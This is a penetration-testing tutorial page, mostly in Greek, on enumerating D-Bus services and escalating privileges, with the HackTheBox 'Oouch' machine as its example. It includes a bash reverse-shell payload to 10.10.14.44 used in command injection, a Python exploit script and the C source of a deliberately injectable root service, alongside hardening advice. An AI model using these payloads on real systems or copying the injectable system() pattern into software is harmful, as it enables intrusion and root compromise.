# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

Το D-Bus χρησιμοποιείται ως ο διαμεσολαβητής inter-process communications (IPC) στα περιβάλλοντα desktop του Ubuntu. Στο Ubuntu, παρατηρείται η ταυτόχρονη λειτουργία πολλών message buses: το system bus, που χρησιμοποιείται κυρίως από **privileged services to expose services relevant across the system**, και ένα session bus για κάθε συνδεδεμένο χρήστη, που εκθέτει services σχετικές μόνο με τον συγκεκριμένο χρήστη. Εδώ η έμφαση δίνεται κυρίως στο system bus λόγω της συσχέτισής του με services που εκτελούνται με υψηλότερα privileges (π.χ. root), καθώς στόχος μας είναι η privilege escalation. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί ένα 'router' ανά session bus, ο οποίος είναι υπεύθυνος για τη δρομολόγηση των client μηνυμάτων προς τις κατάλληλες services βάσει της διεύθυνσης που καθορίζουν οι clients για τη service με την οποία θέλουν να επικοινωνήσουν.

Οι services στο D-Bus ορίζονται από τα **objects** και τα **interfaces** που εκθέτουν. Τα objects μπορούν να παρομοιαστούν με class instances σε τυπικές OOP γλώσσες, με κάθε instance να αναγνωρίζεται μοναδικά από ένα **object path**. Αυτό το path, παρόμοιο με ένα filesystem path, αναγνωρίζει μοναδικά κάθε object που εκτίθεται από τη service. Ένα βασικό interface για έρευνα είναι το **org.freedesktop.DBus.Introspectable** interface, το οποίο διαθέτει μία μόνο μέθοδο, το Introspect. Αυτή η μέθοδος επιστρέφει μια XML αναπαράσταση των supported methods, signals και properties του object, με έμφαση εδώ στα methods και παράλειψη των properties και signals.

Για επικοινωνία με το D-Bus interface, χρησιμοποιήθηκαν δύο tools: ένα CLI tool με όνομα **gdbus** για εύκολη κλήση methods που εκτίθενται από το D-Bus σε scripts, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα Python-based GUI tool σχεδιασμένο να απαριθμεί τις services που είναι διαθέσιμες σε κάθε bus και να εμφανίζει τα objects που περιέχονται μέσα σε κάθε service.
```bash
sudo apt-get install d-feet
```
Αν ελέγχετε το **session bus**, επιβεβαιώστε πρώτα τη τρέχουσα διεύθυνση:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Στην πρώτη εικόνα εμφανίζονται οι services που έχουν καταχωρηθεί στο D-Bus system bus, με το **org.debin.apt** να είναι ειδικά επισημασμένο αφού επιλεγεί το κουμπί System Bus. Το D-Feet κάνει query αυτό το service για objects, εμφανίζοντας interfaces, methods, properties και signals για τα επιλεγμένα objects, όπως φαίνεται στη δεύτερη εικόνα. Επίσης, εμφανίζεται αναλυτικά το signature κάθε method.

Ένα αξιοσημείωτο χαρακτηριστικό είναι η εμφάνιση του **process ID (pid)** και της **command line** του service, χρήσιμο για επιβεβαίωση αν το service εκτελείται με αυξημένα privileges, κάτι σημαντικό για τη συνάφεια της έρευνας.

**Το D-Feet επιτρέπει επίσης invocation methods**: οι χρήστες μπορούν να εισάγουν Python expressions ως παραμέτρους, τα οποία το D-Feet μετατρέπει σε D-Bus types πριν τα περάσει στο service.

Ωστόσο, σημειώστε ότι **ορισμένα methods απαιτούν authentication** πριν μας επιτρέψουν να τα invoke. Θα αγνοήσουμε αυτά τα methods, αφού στόχος μας είναι να κάνουμε elevate τα privileges μας χωρίς credentials εξαρχής.

Σημειώστε επίσης ότι ορισμένα από τα services κάνουν query σε ένα άλλο D-Bus service με όνομα org.freedeskto.PolicyKit1 σχετικά με το αν ένας user πρέπει να επιτρέπεται να εκτελέσει ορισμένες actions ή όχι.

## **Cmd line Enumeration**

### List Service Objects

Είναι δυνατό να εμφανίσουμε τα ανοιχτά D-Bus interfaces με:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Οι υπηρεσίες που σημειώνονται ως **`(activatable)`** είναι ιδιαίτερα ενδιαφέρουσες επειδή **δεν εκτελούνται ακόμα**, αλλά ένα αίτημα bus μπορεί να τις ξεκινήσει on demand. Μην σταματάς στο `busctl list`; χαρτογράφησε αυτά τα ονόματα στα πραγματικά binaries που θα εκτελούσαν.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Αυτό σου λέει γρήγορα ποιο path `Exec=` θα ξεκινήσει για ένα activatable name και υπό ποια identity. Αν το binary ή η αλυσίδα εκτέλεσής του είναι weakly protected, μια inactive service μπορεί ακόμα να γίνει path για privilege-escalation.

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν μια process στήνει μια connection σε ένα bus, το bus αναθέτει στη connection ένα ειδικό bus name που ονομάζεται _unique connection name_. Τα bus names αυτού του τύπου είναι immutable—είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η connection—και, πιο σημαντικό, δεν μπορούν να επαναχρησιμοποιηθούν κατά τη διάρκεια του bus lifetime. Αυτό σημαίνει ότι καμία άλλη connection σε αυτό το bus δεν θα έχει ποτέ λάβει τέτοιο unique connection name, ακόμη κι αν η ίδια process κλείσει τη connection στο bus και δημιουργήσει μια νέα. Τα unique connection names αναγνωρίζονται εύκολα επειδή ξεκινούν με τον—κατά τα άλλα forbidden—χαρακτήρα άνω-κάτω τελεία.

### Service Object Info

Στη συνέχεια, μπορείς να πάρεις κάποιες πληροφορίες για το interface με:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Συσχέτισε επίσης το όνομα του bus με το `systemd` unit του και το executable path:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Αυτό απαντά στο επιχειρησιακό ερώτημα που έχει σημασία κατά το privesc: **αν μια κλήση μεθόδου πετύχει, ποιο πραγματικό binary και ποια unit θα εκτελέσουν την ενέργεια;**

### List Interfaces of a Service Object

Χρειάζεσαι αρκετά permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Ενδοσκόπηση του Interface ενός Service Object

Σημειώστε πώς σε αυτό το παράδειγμα επιλέχθηκε το πιο πρόσφατο interface που ανακαλύφθηκε χρησιμοποιώντας την παράμετρο `tree` (_δείτε προηγούμενη ενότητα_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Σημειώστε τη μέθοδο `.Block` της διεπαφής `htb.oouch.Block` (αυτή που μας ενδιαφέρει). Το "s" των άλλων στηλών μπορεί να σημαίνει ότι αναμένει ένα string.

Πριν δοκιμάσετε οτιδήποτε επικίνδυνο, επικυρώστε πρώτα μια **read-oriented** ή γενικά χαμηλού ρίσκου μέθοδο. Αυτό ξεχωρίζει καθαρά τρεις περιπτώσεις: λάθος σύνταξη, προσβάσιμο αλλά denied, ή προσβάσιμο και allowed.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Συσχέτιση D-Bus Methods με Policies και Actions

Το introspection σου λέει **τι** μπορείς να καλέσεις, αλλά δεν σου λέει **γιατί** μια κλήση επιτρέπεται ή απορρίπτεται. Για πραγματικό privesc triage συνήθως χρειάζεται να επιθεωρήσεις **τρεις layers μαζί**:

1. **Activation metadata** (`.service` files or `SystemdService=`) για να μάθεις ποιο binary και unit θα εκτελεστούν πραγματικά.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) για να μάθεις ποιος μπορεί να `own`, `send_destination`, ή `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) για να μάθεις το default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Χρήσιμες εντολές:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Μην **υποθέτετε** μια αντιστοίχιση 1:1 ανάμεσα σε ένα D-Bus method και ένα Polkit action. Το ίδιο method μπορεί να επιλέξει διαφορετικό action ανάλογα με το object που τροποποιείται ή με το runtime context. Επομένως, η πρακτική ροή εργασίας είναι:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` και grep τα σχετικά `.policy` files
3. χαμηλού ρίσκου live probes με `busctl call`, `gdbus call`, ή `dbusmap --enable-probes --null-agent`

Οι proxy ή compatibility services αξίζουν extra προσοχή. Ένας **root-running proxy** που προωθεί requests σε άλλο D-Bus service μέσω της δικής του ήδη-established connection μπορεί κατά λάθος να κάνει το backend να αντιμετωπίζει κάθε request σαν να προέρχεται από UID 0, εκτός αν η ταυτότητα του αρχικού caller επαληθευτεί ξανά.

### Monitor/Capture Interface

Με αρκετά privileges (τα `send_destination` και `receive_sender` privileges δεν αρκούν) μπορείτε να **monitor ένα D-Bus communication**.

Για να **monitor** ένα **communication** θα πρέπει να είστε **root.** Αν εξακολουθείτε να βρίσκετε προβλήματα όντας root, δείτε [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Αν ξέρετε πώς να ρυθμίσετε ένα D-Bus config file ώστε να **επιτρέπει σε non root users να sniff** το communication, παρακαλώ **επικοινωνήστε μαζί μου**!

Διαφορετικοί τρόποι για να monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Στο ακόλουθο παράδειγμα η διεπαφή `htb.oouch.Block` παρακολουθείται και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται μέσω miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Μπορείς να χρησιμοποιήσεις `capture` αντί για `monitor` για να αποθηκεύσεις τα αποτελέσματα σε ένα αρχείο **pcapng** που μπορεί να ανοίξει το Wireshark:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Φιλτράροντας όλο τον θόρυβο <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Αν υπάρχουν απλώς πάρα πολλές πληροφορίες στο bus, πέρασε έναν κανόνα αντιστοίχισης όπως αυτόν:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Μπορούν να καθοριστούν πολλοί κανόνες. Αν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμα θα εκτυπωθεί. Όπως εδώ:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Δείτε την [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) για περισσότερες πληροφορίες σχετικά με τη σύνταξη match rule.

### More

Το `busctl` έχει ακόμα περισσότερες επιλογές, [**βρείτε όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Ως user **qtc inside the host "oouch" from HTB** μπορείτε να βρείτε ένα **unexpected D-Bus config file** που βρίσκεται στο _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Note from the previous configuration that **θα χρειαστεί να είστε ο χρήστης `root` ή `www-data` για να στείλετε και να λάβετε πληροφορίες** μέσω αυτής της D-BUS επικοινωνίας.

Ως χρήστης **qtc** μέσα στο docker container **aeb4525789d8** μπορείτε να βρείτε κάποιο dbus-related code στο αρχείο _/code/oouch/routes.py._ Αυτό είναι το ενδιαφέρον code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Όπως μπορείτε να δείτε, γίνεται **σύνδεση σε ένα D-Bus interface** και αποστέλλεται στη **"Block" function** το "client_ip".

Στην άλλη πλευρά της D-Bus σύνδεσης υπάρχει κάποιο compiled binary σε C που εκτελείται. Αυτός ο κώδικας **ακούει** στη D-Bus σύνδεση **για IP address και καλεί το iptables μέσω της `system` function** για να μπλοκάρει τη δοσμένη IP address.\
**Η κλήση στη `system` είναι ευάλωτη επίτηδες σε command injection**, οπότε ένα payload όπως το παρακάτω θα δημιουργήσει ένα reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε τον **πλήρη C code της D-Bus application**. Μέσα σε αυτόν μπορείτε να βρείτε, μεταξύ των γραμμών 91-97, **πώς το `D-Bus object path`** **και το `interface name`** **καταχωρούνται**. Αυτή η πληροφορία θα είναι απαραίτητη για να στείλετε πληροφορία στη D-Bus σύνδεση:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Επίσης, στη γραμμή 57 μπορείτε να δείτε ότι **η μόνη καταχωρημένη μέθοδος** για αυτήν την D-Bus επικοινωνία ονομάζεται `Block`(_**Γι’ αυτό στην παρακάτω ενότητα τα payloads θα σταλούν στο service object `htb.oouch.Block`, στο interface `/htb/oouch/Block` και στο method name `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Ο παρακάτω κώδικας python θα στείλει το payload στη σύνδεση D-Bus προς τη μέθοδο `Block` μέσω του `block_iface.Block(runme)` (_σημείωση ότι προήλθε από το προηγούμενο τμήμα κώδικα_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για να στέλνει μήνυμα στο “Message Bus”
- Message Bus – Ένα software που χρησιμοποιείται από συστήματα για να διευκολύνει την επικοινωνία μεταξύ applications. Σχετίζεται με το Message Queue (τα messages είναι ταξινομημένα σε σειρά) αλλά στο Message Bus τα messages αποστέλλονται σε μοντέλο subscription και επίσης πολύ γρήγορα.
- Το “-system” tag χρησιμοποιείται για να δηλώσει ότι είναι ένα system message, όχι ένα session message (by default).
- Το “–print-reply” tag χρησιμοποιείται για να εκτυπώνει σωστά το μήνυμά μας και να λαμβάνει τυχόν replies σε human-readable format.
- Το “–dest=Dbus-Interface-Block” Η διεύθυνση του Dbus interface.
- Το “–string:” – Τύπος message που θέλουμε να στείλουμε στο interface. Υπάρχουν αρκετά formats αποστολής messages όπως double, bytes, booleans, int, objpath. Από αυτά, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε ένα path ενός file στο Dbus interface. Μπορούμε να χρησιμοποιήσουμε ένα ειδικό file (FIFO) σε αυτή την περίπτωση για να περάσουμε μια command στο interface με το όνομα ενός file. “string:;” – Αυτό χρησιμοποιείται για να καλέσουμε ξανά το object path όπου τοποθετούμε το FIFO reverse shell file/command.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

Η Enumeration ενός μεγάλου D-Bus attack surface χειροκίνητα με `busctl`/`gdbus` γίνεται γρήγορα κουραστική. Δύο μικρά FOSS utilities που κυκλοφόρησαν τα τελευταία χρόνια μπορούν να επιταχύνουν τη διαδικασία σε red-team ή CTF engagements:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Το tool επισημαίνει τα unprotected well-known names με `!`, αποκαλύπτοντας αμέσως services που μπορείς να *own* (take over) ή method calls που είναι reachable από unprivileged shell.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Το D-Bus module ψάχνει στους παρακάτω directories και επισημαίνει κάθε service που μπορεί να spoofed ή hijacked από κανονικό user:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Το να παρακολουθείς πρόσφατα δημοσιευμένα CVEs βοηθά στο να εντοπίζεις παρόμοια insecure patterns σε custom code. Δύο καλά πρόσφατα παραδείγματα είναι:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Το root-running service εξέθετε ένα D-Bus interface που οι unprivileged users μπορούσαν να reconfigure, συμπεριλαμβανομένου του loading attacker-controlled macro behavior. | Αν ένα daemon εκθέτει **device/profile/config management** στο system bus, αντιμετώπισε τα writable configuration και macro features ως code-execution primitives, όχι απλώς ως "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ένα root-running compatibility proxy προωθούσε requests προς backend services χωρίς να διατηρεί το security context του αρχικού caller, οπότε τα backends εμπιστεύονταν το proxy ως UID 0. | Αντιμετώπισε τα **proxy / bridge / compatibility** D-Bus services ως ξεχωριστή bug class: αν relaying privileged calls, επαλήθευσε πώς το caller UID/Polkit context φτάνει στο backend. |

Patterns to notice:
1. Service runs **as root on the system bus**.
2. Either there is **no authorization check**, or the check is performed against the **wrong subject**.
3. The reachable method eventually changes system state: package install, user/group changes, bootloader config, device profile updates, file writes, or direct command execution.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
